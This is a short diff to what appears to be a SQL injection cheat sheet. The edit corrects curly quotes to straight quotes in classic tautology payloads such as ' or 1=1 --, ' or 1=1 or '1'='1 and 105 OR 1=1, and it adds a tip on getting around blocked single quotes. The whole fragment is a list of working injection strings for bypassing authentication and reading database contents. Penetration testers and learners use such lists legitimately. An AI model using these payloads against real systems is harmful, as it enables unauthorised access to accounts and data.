@@ -45,9 +45,9 @@ SQLInjection Basic Stuff
 -------------
 ```
 ' or 1=1 --
-‘ or 1=1 or ‘1’=’1
+' or 1=1 or '1'='1
 # If single quotes are blocked try delimiting them
-/‘ or 1=1 or ‘1’=’1
+/' or 1=1 or '1'='1
 /' or 1=1 --
 '"
 105 OR 1=1
